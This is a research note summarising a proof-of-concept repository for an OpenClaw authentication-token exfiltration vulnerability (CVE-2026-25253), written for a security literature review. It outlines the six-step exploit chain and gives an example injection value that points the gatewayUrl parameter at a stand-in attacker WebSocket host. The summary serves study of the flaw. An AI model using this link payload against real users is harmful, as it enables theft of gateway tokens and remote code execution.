# GitHub: EQSTLab/CVE-2026-25253 — OpenClaw Authentication Token Exfiltration PoC

> Security PoC | 2026-03-09

## 1. Core Claim
OpenClaw (aka clawdbot / Moltbot) before **v2026.1.29** contains an authentication token exfiltration vulnerability (CVE-2026-25253). An attacker can steal the gateway authentication token by supplying a crafted `gatewayUrl` query-string value to the Control UI, which automatically establishes a WebSocket connection without validation or user confirmation. This leads to unauthorized gateway access and **1-click remote code execution**.

## 2. Method / Mechanism
- **Affected versions**: All OpenClaw releases prior to v2026.1.29
- **Attack vector**: URL query-string parameter injection (`?gatewayUrl=ws://attacker.com`)
- **Root cause**: Control UI accepts user-supplied WebSocket gateway URL and connects automatically without confirmation
- **Exploit chain**:
  1. Attacker crafts malicious link with attacker-controlled `gatewayUrl`
  2. Victim clicks the link while authenticated in OpenClaw
  3. `applySettingsFromUrl()` stores the attacker-controlled gatewayUrl
  4. OpenClaw initiates WebSocket connection and sends connect frame containing auth token, device ID, and public key
  5. Attacker captures the authentication token
  6. Attacker reconnects to legitimate gateway using stolen token → RCE
- **Fix commit**: `8cb0fa993ba0ba4a3e24c2a9e0416ab2ca796dcf`

## 3. Key Evidence
- Verified PoC with Docker environment included in repository
- Python 3.x exploit server (`exploit.py`)
- Dockerfile for building vulnerable OpenClaw environment
- Official CVE record: CVE-2026-25253

## 4. Limitations & Gaps
- PoC focuses on token exfiltration; actual RCE payload depends on victim's OpenClaw configuration and permissions
- Requires victim to click a malicious link (social engineering)
- Localhost deployment is also vulnerable due to browser WebSocket bypass (Chrome has not enabled Local Network Access by default)

## 5. Relevance to Our Review
- Core source for OpenClaw security vulnerability section
- Replaces failed S003/S004 arXiv sources and outdated S031 Skywork blog
- Provides verified technical details for CVE-2026-25253

## 6. Cross-References
- **S131**: SonicWall threat research — vendor confirmation of same vulnerability
- **S133**: Ethiack original disclosure — AI pentest robot (Hackian) discovered the bug in <2h
- **S134**: CSDN reproduction — Chinese-language Docker setup guide
- **S001/S002**: OpenClaw official docs — architecture being attacked

## Local Assets
- PDF: `./cited-materials/s132-github-eqstlab-cve-2026-25253.pdf`
